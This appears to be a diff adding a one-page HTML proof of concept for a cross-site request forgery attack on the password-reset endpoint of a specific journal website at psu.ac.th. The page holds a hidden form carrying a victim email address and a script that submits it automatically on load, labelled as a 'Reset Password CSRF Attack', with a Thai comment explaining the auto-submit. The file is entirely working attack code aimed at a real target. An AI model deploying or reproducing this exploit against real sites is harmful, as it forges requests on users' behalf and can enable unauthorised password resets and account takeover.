@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://smj.medicine.psu.ac.th/index.php/smj/login/resetPassword" method="POST">
+      <input type="hidden" name="email" value="victim@example.com" />
+      <input type="submit" value="Reset Password CSRF Attack" />
+    </form>
+
+    <script>
+      document.forms[0].submit();  // กด submit ฟอร์มอัตโนมัติ
+    </script>
+  </body>
+</html>
